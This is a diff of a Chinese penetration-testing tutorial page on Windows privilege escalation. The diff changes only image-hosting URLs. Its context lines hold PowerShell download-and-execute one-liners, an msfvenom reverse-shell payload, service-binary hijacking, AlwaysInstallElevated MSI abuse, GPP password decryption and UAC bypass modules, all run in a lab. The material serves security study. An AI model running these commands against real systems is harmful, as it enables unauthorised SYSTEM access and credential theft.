@@ -224,7 +224,7 @@ powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-ex
 <h3 id="4-1-2-利用Metasploit-发现缺失补丁"><a href="#4-1-2-利用Metasploit-发现缺失补丁" class="headerlink" title="4.1.2 利用Metasploit 发现缺失补丁"></a>4.1.2 利用Metasploit 发现缺失补丁</h3><p>利用Metasploit中的<code>enum_patches</code>模块，可以根据漏洞编号快速找出系统中缺少的补丁。</p>
 <pre><code class="hljs shell">use post/windows/gather/enum_patches</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118003450642.png" alt="image-20220118003450642 "></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118003450642.png" alt="image-20220118003450642 "></p>
 <h3 id="4-1-3-Windows-Exploit-Suggester"><a href="#4-1-3-Windows-Exploit-Suggester" class="headerlink" title="4.1.3 Windows Exploit Suggester"></a>4.1.3 Windows Exploit Suggester</h3><p>Gotham Digital Security 发布了—个名为 <code>Windows Exploit Suggester</code> 的工具，该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其需要的只有目标系统的信息。 使用<code>systeminfo</code>命令获取当前系统的补丁安装情况，并将补丁信息导入 <code>patches.txt</code> 文件。</p>
 <p>repo:<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
 <p><code>BulletinSearch.xlsx</code>下载：</p>
@@ -241,7 +241,7 @@ systeminfo &gt; systeminfo.txt
 <span class="hljs-meta">#</span><span class="bash">查询</span>
 python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo systeminfo.txt</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118012525617.png" alt="image-20220118012525617"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118012525617.png" alt="image-20220118012525617"></p>
 <p>看起来效果还可以，不过<code>BulletinSearch.xlsx</code>到2017年3月14日就没有了，可以使用<code>bitsadmin</code>的<code>Windows Exploit Suggester</code>下一代版本，增加了对 Windows 11 等操作系统漏洞和近年来发布的漏洞的检测支持。</p>
 <p>repo:<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
 <p>使用的是<code>definitions.zip</code>作为数据库，手动下载地址：</p>
@@ -268,7 +268,7 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
 <span class="hljs-comment">#查找所有漏洞</span>
 <span class="hljs-built_in">Find-AllVulns</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118015405967.png" alt="image-20220118015405967"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118015405967.png" alt="image-20220118015405967"></p>
 <p>查找单个漏洞，如果不使用CS可能需要修改脚本：</p>
 <pre><code class="hljs powershell"><span class="hljs-comment">#1</span>
 <span class="hljs-built_in">Set-ExploitTable</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span> 
@@ -280,7 +280,7 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
 <h3 id="4-1-5-利用一些在线平台"><a href="#4-1-5-利用一些在线平台" class="headerlink" title="4.1.5 利用一些在线平台"></a>4.1.5 利用一些在线平台</h3><p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p>
 <p><a target="_blank" rel="noopener" href="https://detect.secwx.com/">https://detect.secwx.com/</a></p>
 <p>粘贴补丁号验证是否存在相关漏洞。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118120320067.png" alt="image-20220118120320067"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118120320067.png" alt="image-20220118120320067"></p>
 <h2 id="4-2-Windows操作系统配置错误利用"><a href="#4-2-Windows操作系统配置错误利用" class="headerlink" title="4.2 Windows操作系统配置错误利用"></a>4.2 Windows操作系统配置错误利用</h2><h3 id="4-2-1-系统服务权限配置错误"><a href="#4-2-1-系统服务权限配置错误" class="headerlink" title="4.2.1 系统服务权限配置错误"></a>4.2.1 系统服务权限配置错误</h3><p>Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如 果一个<strong>低权限</strong>的用户对此类系统服务调用的可执行文件<strong>拥有写权限</strong>，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
 <p>Windows服务是以System权限运行的，因 此，其文件夹、文件和注册表键值都是受强访问控制机制保护的，但是，在某些情况下，操作系统中仍然存在—些没有得到有效保护的服务。  </p>
 <p>系统服务权限配置错误（可写目录漏洞）有如下两种可能：</p>
@@ -301,11 +301,11 @@ powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-ex
 <span class="hljs-comment">#本地下载执行</span>
 powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220119221206512.png" alt="image-20220119221206512"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220119221206512.png" alt="image-20220119221206512"></p>
 <p><code>PowerUp</code> 列出了可能存在问题的所有服务，并在 <code>AbuseFunction</code> 部分直接给出了 利用方式。在这里检测出存在<code>ADWS</code>服务漏洞，Path值为该服务的可执行程序的路径。</p>
 <pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Invoke-ServiceAbuse</span> <span class="hljs-literal">-ServiceName</span> <span class="hljs-string">&quot;ADWS&quot;</span> hacker <span class="hljs-literal">-Password</span> Passw0<span class="hljs-built_in">rd</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220119221841489.png" alt="image-20220119221841489"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220119221841489.png" alt="image-20220119221841489"></p>
 <h4 id="2-MetaSploit"><a href="#2-MetaSploit" class="headerlink" title="2. MetaSploit"></a>2. MetaSploit</h4><p>对应的利用模块是service_permissions。选择 “AGGRESSIVE” 选项，可以利用目标机器上每-个有缺陷的服务。该选项被禁用时，该模块在第一次提权成功后就会停止工作。</p>
 <p>service_permissions 模块使用两种方法来获得System权限：</p>
 <ul>
@@ -313,10 +313,10 @@ powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-ex
 <li>如果当前权限不允许创建服务，该模块会判断哪些 服务的文件或者文件夹的权限有问题，并允许对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建—个可执行程序，其文件名和安装路径都是随机的。</li>
 </ul>
 <p>执行 “run” 命令，会自动反弹—个新的meterpreter（System权限）。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122153058605.png" alt="image-20220122153058605"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122153058605.png" alt="image-20220122153058605"></p>
 <h3 id="4-2-2-注册表键AlwaysInstallElevated"><a href="#4-2-2-注册表键AlwaysInstallElevated" class="headerlink" title="4.2.2 注册表键AlwaysInstallElevated"></a>4.2.2 注册表键<code>AlwaysInstallElevated</code></h3><p>注册表键<code>AlwaysInstallElevated</code>是—个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以 <code>NTAUTHORITY\SYSTEM</code>权限来安装恶意的<code>MSI(MicrosoRWindowsInstaller)</code>文件。</p>
 <h4 id="1-PathsAlwaysInstallElevated-漏洞产生的原因"><a href="#1-PathsAlwaysInstallElevated-漏洞产生的原因" class="headerlink" title="1. PathsAlwaysInstallElevated 漏洞产生的原因"></a>1. <code>PathsAlwaysInstallElevated</code> 漏洞产生的原因</h4><p>​        原因：用户开启了<code>WindowsInstaller</code>特权安装功能</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122154749267.png" alt="image-20220122154749267"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122154749267.png" alt="image-20220122154749267"></p>
 <p>在 “运行” 设置框中输入 “gpedit.msc”，打开组策略编辑器。</p>
 <ul>
 <li>组策略一计算机配置—管理模板—Windows 组件—Windows Installer—永远以高特权进行<br>安装：选择启用。</li>
@@ -334,9 +334,9 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <h4 id="3-PowerUp下的实战利用"><a href="#3-PowerUp下的实战利用" class="headerlink" title="3. PowerUp下的实战利用"></a>3. PowerUp下的实战利用</h4><p>在这里，可以使用PowerUp的<code>Get-RegistryAlwaysInstallElevated</code>模块来检查注册表键是否被设置。如果<code>AlwaysInstallElevated</code>注册表键已经被设置，就意味着MSI文件是以System权限运行的。运行该模块的命令如下，“True”表示已经设置。</p>
 <pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Get-RegistryAlwaysInstallElevated</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122163617342.png" alt="image-20220122163617342"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122163617342.png" alt="image-20220122163617342"></p>
 <p>添加用户，运行<code>Write-UserAddMSI</code>模块，生成MSI文件并执行。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122164437187.png" alt="image-20220122164437187"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122164437187.png" alt="image-20220122164437187"></p>
 <p>msiexec 参数解释：</p>
 <pre><code class="hljs powershell">安装选项
 	&lt;/package | /i&gt; &lt;Product.msi&gt;
@@ -369,17 +369,17 @@ set LHOST 192.168.2.6
 set SESSION 1
 run</code></pre>
 
-<p>​        <img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122174614476.png" alt="image-20220122174614476"></p>
+<p>​        <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122174614476.png" alt="image-20220122174614476"></p>
 <h4 id="5-用Msi-Wrapper生成msi文件进行提权"><a href="#5-用Msi-Wrapper生成msi文件进行提权" class="headerlink" title="5. 用Msi Wrapper生成msi文件进行提权"></a>5. 用Msi Wrapper生成msi文件进行提权</h4><p>该软件的主要作用就是将<code>exe</code>转化为<code>msi</code>文件，下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
 <p>使用<code>MSFvenom</code>生成 <code>exec</code> 木马，之后再使用<code>MSI Wrapper</code> 进行打包为 <code>MSI</code>。</p>
 <pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.6 LPORT=4444 -f exe-only &gt;3.exe</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122181831460.png" alt="image-20220122181831460"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122181946241.png" alt="image-20220122181946241"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122181831460.png" alt="image-20220122181831460"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122181946241.png" alt="image-20220122181946241"></p>
 <p>创建一个新的upgrade code 继续下一步即可，最终生成MSI的文件，运行即可上线，权限直接为SYSTEM。</p>
 <pre><code class="hljs powershell">msiexec /qn /i <span class="hljs-number">3</span>.msi</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122182732528.png" alt="image-20220122182732528"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122182732528.png" alt="image-20220122182732528"></p>
 <h4 id="6-利用MSFvenom"><a href="#6-利用MSFvenom" class="headerlink" title="6. 利用MSFvenom"></a>6. 利用MSFvenom</h4><p>生成msi文件：</p>
 <pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kali执行</span>
 msfvenom -p windows/exec CMD=calc.exe -f msi &gt; calc.msi
@@ -387,7 +387,7 @@ msfvenom -p windows/exec CMD=calc.exe -f msi &gt; calc.msi
 msiexec  /qn /i calc.msi
 tasklist /v | findstr &quot;calc.exe&quot;</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122180904998.png" alt="image-20220122180904998"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122180904998.png" alt="image-20220122180904998"></p>
 <h3 id="4-2-3-可信任的服务器路径漏洞"><a href="#4-2-3-可信任的服务器路径漏洞" class="headerlink" title="4.2.3 可信任的服务器路径漏洞"></a>4.2.3 可信任的服务器路径漏洞</h3><p>​        可信任服务路径（包含空格且没有引号的路径）漏洞利用了 Windows 文件路径解析的特性，并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p>
 <p>该漏洞存在如下两种可能性:</p>
 <ul>
@@ -408,7 +408,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i <span class="hl
 <span class="hljs-string">icacls &quot;</span>C:\Program Files\phpstudy\phpstudy_pro\\<span class="hljs-string">&quot;</span></code></pre>
 
 <p>之后使用Windows的内置工具<code>icacls</code>对目录权限进行判断，主要判断是否可写。本次以<code>phpstudy</code>为例，查看权限(<code>BUILTIN</code>代表本地组)：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220124223922142.png" alt="image-20220124223922142"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124223922142.png" alt="image-20220124223922142"></p>
 <p><code>Everyone:(OI)(CI)(F)</code>的意思是，对该文件夹，用户有读、写、删除其下文件、删除其子目录的权限。</p>
 <ul>
 <li>Everyone：用户对这个文件夹有完全控制权限。也就是说，所有用户都具有修改这个文件夹的权限- </li>
@@ -418,12 +418,12 @@ wmic service get name,displayname,pathname,startmode |findstr /i <span class="hl
 <li>(OI)：对象继承，从属文件将继承访问控制项</li>
 </ul>
 <p>之后替换服务，将后门文件命名为原服务文件，重启服务即可获取SYSTEM权限的shell（也可以使用模块<code>exploit/windows/local/trusted_service_path</code>直接利用）。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220124225715368.png" alt="image-20220124225715368"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124225715368.png" alt="image-20220124225715368"></p>
 <pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> stop phpStudySrv
 <span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> phpStudySrv</code></pre>
 
 <p>其中<code>phpStudyServer.exe</code>为木马文件，<code>phpStudyServer_bak.exe</code> 为原服务的备份文件。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220124225918498.png" alt="image-20220124225918498"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124225918498.png" alt="image-20220124225918498"></p>
 <p>可以看到不一会儿会话就被关闭了，这是由于当—个进程在Windows操作系统中启动后，必须与跟务控制管理器进行通信，如果没有进行通信，服务控制管理器会认为出现了错误，进而终止这个进程。在渗透测试中，需要在终止载荷进程之前将它迁移到其他进程中（可以使用<code>set AutoRunScipt migrate -f</code>，自动迁移进程命令）</p>
 <h3 id="4-2-4-自动安装配置文件"><a href="#4-2-4-自动安装配置文件" class="headerlink" title="4.2.4 自动安装配置文件"></a>4.2.4 自动安装配置文件</h3><p>​        网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员账号和密码等信息。这些文件列举如下（可以对整个系统进行检查）。</p>
 <pre><code class="hljs powershell">C:\sysprep.inf
@@ -749,7 +749,7 @@ C:\Windows\System32\Sysprep\Panther\unattend.xml</code></pre>
 <pre><code class="hljs powershell">sysprep /generalize /oobe /shutdown /unattend:unattend.xml</code></pre>
 
 <p>主要关注该文件中存在的账户以及密码(明文或者<code>base64</code>编码)，可以使用<code>metasploit</code>模块<code>post/windows/gather/enum_unattend</code>:</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220125014428626.png" alt="image-20220125014428626"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220125014428626.png" alt="image-20220125014428626"></p>
 <p>虽然配置了密码，但是好像没生效，所以就是空密码了。</p>
 <h3 id="4-2-5-计划任务"><a href="#4-2-5-计划任务" class="headerlink" title="4.2.5 计划任务"></a>4.2.5 计划任务</h3><p>查询计划任务：</p>
 <pre><code class="hljs powershell"><span class="hljs-comment">#英文</span>
@@ -757,7 +757,7 @@ schtasks /query /fo LIST /v | findstr /C:<span class="hljs-string">&quot;Task To
 <span class="hljs-comment">#中文</span>
 schtasks /query /fo LIST /v | findstr /C:<span class="hljs-string">&quot;要运行的任务&quot;</span> | findstr <span class="hljs-string">&quot;.exe&quot;</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220125153001541.png" alt="image-20220125153001541"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220125153001541.png" alt="image-20220125153001541"></p>
 <p><code>AccessChk</code> 是 <code>SysInterals</code> 套件中的一个工具，由<code>MarkRussinovich</code>编写，用于在Windows中进行一些系统或程序的高级查询、管理和故障排除工作，<code>AccessChk</code>下载地址:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
 <p>由于杀毒软件的检测等，攻击者会尽量避免接触目标机器的磁盘。而<code>AccessChk</code>是微软官方提供的工具，一般不会引起杀毒软件的报警，所以经常会被攻击者利用。<strong>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。</strong>这样，在计划任务下次执行时，就会以高权限来运行恶意程序。第一次运行<code>SysIntemals</code>工具包里的工具时，会弹出一个许可协议对话框。在这里，可以使用参数 <code>/accepteula</code> 自动接受许可协议，命令如下。</p>
 <pre><code class="hljs powershell"><span class="hljs-comment">#自动接受许可协议</span>
@@ -804,12 +804,12 @@ pause</code></pre>
 
 
 <h3 id="4-2-6-Empire-内置模块"><a href="#4-2-6-Empire-内置模块" class="headerlink" title="4.2.6 Empire 内置模块"></a>4.2.6 Empire 内置模块</h3><p><code>Empire</code> 内置了 <code>PowerUp</code> 的部分模块。输入<code>usemodule privesc/powerup</code>命令，然后按<code>Tab</code>键，查看<code>PowerUp</code>的模块列表。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220126223637695.png" alt="image-20220126223637695"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220126223637695.png" alt="image-20220126223637695"></p>
 <p><code>AIIChecks</code> 模块用于查找系统中的漏洞。<code>AllChecks</code> 模块可用于执行脚本、检查系统漏洞。</p>
 <pre><code class="hljs ruby">usemodule privesc/powerup/allchecks
 execute</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220126230507949.png" alt="image-20220126230507949"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220126230507949.png" alt="image-20220126230507949"></p>
 <p><code>AllChecks</code>模块的应用对象如下:</p>
 <ul>
 <li>没有被引号引起来的服务的路径</li>
@@ -835,14 +835,14 @@ execute</code></pre>
 <li>计划任务（<code>ScheduledTasks.xml</code>）</li>
 </ul>
 <h3 id="4-3-2-组策略首选项提权分析"><a href="#4-3-2-组策略首选项提权分析" class="headerlink" title="4.3.2 组策略首选项提权分析"></a>4.3.2 组策略首选项提权分析</h3><h4 id="1-创建组策略"><a href="#1-创建组策略" class="headerlink" title="1. 创建组策略"></a>1. 创建组策略</h4><p><code>Win + R</code> 运行 <code>gpedit.msc</code>(<code>windows2003</code>的话就是<code>dsa.msc</code>)，右键组策略对象新建test：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220127115548152.png" alt="(image-20220127115548152)"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220127115548152.png" alt="(image-20220127115548152)"></p>
 <p>之后编辑，选择更新内置的administrator密码，不过测试下来本地管理员账户密码并没有被修改，刷新策略也没用，暂未找到原因，有了解的大哥可以指点一下。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220127222254536.png" alt="image-20220127222254536"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220127222254536.png" alt="image-20220127222254536"></p>
 <h4 id="2-获取组策略凭据"><a href="#2-获取组策略凭据" class="headerlink" title="2. 获取组策略凭据"></a>2. 获取组策略凭据</h4><p>​        管理员在域中新建一个组策略后，操作系统会自动在 <code>SYSVOL</code> 共享目录中生成一个 <code>XML</code>文件，该文件中保存了该组策略更新后的密码。该密码使用<code>AES-256</code>加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在<code>XML</code>文件中的密码的安全性大大降低。任何域用户和域信任的用户均可对该共享目标进行访问，这就意味着，任何用户都可以访问保存在 <code>XML</code> 文件中的密码并将其解密，从而控制域中所有使用该账户/密码的本地管理员计算机。在<code> SYSVOL</code> 中搜索，可以找到包含 <code>cpassword</code> 的 XML 文件。</p>
 <h5 id="2-1-手动查找"><a href="#2-1-手动查找" class="headerlink" title="2.1 手动查找"></a>2.1 手动查找</h5><p>远程连接共享查看：</p>
 <pre><code class="hljs powershell"><span class="hljs-built_in">type</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">2.20</span>\sysvol\test.com\Policies\&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D</span><span class="hljs-literal">-11D2</span><span class="hljs-literal">-945F</span><span class="hljs-literal">-00C04FB984F9</span>&#125;\MACHINE\Preferences\Groups\Groups.xml</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128093720830.png" alt="image-20220128093720830"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128093720830.png" alt="image-20220128093720830"></p>
 <p>对<code>cpassword</code>字段解密：</p>
 <pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kali自带工具</span>
 gpp-decrypt 7ud2rxJhwxT5iaNrNltLxTsE79YZ9JxpZ3rL7k9HJQ0</code></pre>
@@ -858,10 +858,10 @@ powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).Downlo
 set session 1
 run</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128112649121.png" alt="image-20220128112649121"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128112649121.png" alt="image-20220128112649121"></p>
 <h5 id="2-5-借助Empire模块privesc-gpp"><a href="#2-5-借助Empire模块privesc-gpp" class="headerlink" title="2.5 借助Empire模块privesc/gpp"></a>2.5 借助<code>Empire</code>模块<code>privesc/gpp</code></h5><pre><code class="hljs shell">usemodule privesc/gpp</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128140629730.png" alt="image-20220128140629730"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128140629730.png" alt="image-20220128140629730"></p>
 <p>除了 <code>Groups.xml</code>，还有几个组策略首选项文件中有可选的 <code>cpassword </code>属性，列举如下:</p>
 <ul>
 <li><code>Services\Services.xml</code></li>
@@ -910,16 +910,16 @@ set target 1
 set session 1</code></pre>
 
 <p><code>bypassuac_injection</code> 模块支持<code>x86</code>和<code>x64</code>版本的<code>Windows 8、8.1、10_1511、10_1607、10_1703</code>。如果不设置<code>payload</code>会报错如下：<code>Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System</code>，其实架构选择没问题。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104541567.png" alt="image-20220130104541567"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104631279.png" alt="image-20220130104631279"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104541567.png" alt="image-20220130104541567"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104631279.png" alt="image-20220130104631279"></p>
 <p>提权对比：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104717878.png" alt="image-20220130104717878"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104717878.png" alt="image-20220130104717878"></p>
 <h3 id="4-4-3-RunAs-模块"><a href="#4-4-3-RunAs-模块" class="headerlink" title="4.4.3 RunAs 模块"></a>4.4.3 <code>RunAs</code> 模块</h3><p><strong>前提：</strong>要想使用 <code>RunAs</code>模块进行提权，当前用户必须在管理员组中或者知道管理员的密码，对<code>UAC</code> 的设置则没有要求。</p>
 <p><strong>原理：</strong><code>This module will attempt to elevate execution level using the ShellExecute undocumented RunAs flag to bypass low UAC settings.</code></p>
 <p>使用<code>exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序（位置：<code>C:\Users\用户名\AppData\Local\Temp\MdIXXegVjPf.exe</code>），<strong>提示用户是否要继续运行</strong>，如果用户选择继续运行程序，就会返回一个高权限的<code>meterpreter Shell</code>。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129151122852.png" alt="image-20220129151122852"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129154355514.png" alt="image-20220129154355514"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129160202411.png" alt="image-20220129160202411"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129151122852.png" alt="image-20220129151122852"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129154355514.png" alt="image-20220129154355514"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129160202411.png" alt="image-20220129160202411"></p>
 <p><code>session 6</code>是返回高权限的<code>shell</code>，使用<code>getsystem</code>即可获取最高权限，可以对比<code>session 5</code>正常获取的<code>shell</code>是获取不到<code>system</code>权限的。</p>
 <p><strong>要点</strong>：</p>
 <ol>
@@ -930,7 +930,7 @@ set session 1</code></pre>
 set path C:\\Users\\test\\Desktop
 set exe::custom /root/miansha.exe</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129162432447.png" alt="image-20220129162432447"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129162432447.png" alt="image-20220129162432447"></p>
 <h3 id="4-4-4-Nishang-中的Invoke-PsUACme"><a href="#4-4-4-Nishang-中的Invoke-PsUACme" class="headerlink" title="4.4.4 Nishang 中的Invoke-PsUACme"></a>4.4.4 <code>Nishang</code> 中的<code>Invoke-PsUACme</code></h3><p><code>Invoke-PsUACme</code> 模块使用来自<code>UACME</code>项目的<code>DLL</code>绕过<code>UAC</code>。影像版本涉及<code>Windows 7/2008/8/2012/Vista X86/64</code>版本。<code>Win 10</code>自带的<code>wsua</code>程序由于不再支持<code>/extract</code>释放命令了，故不再适用。repo:<a target="_blank" rel="noopener" href="https://github.com/dowdyph0/UACME">https://github.com/dowdyph0/UACME</a></p>
 <p>参数说明：</p>
 <pre><code class="hljs powershell"><span class="hljs-comment"># 使用 Sysprep方法并执行默认的 Payload</span>
@@ -960,25 +960,25 @@ powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-ex
 </ul>
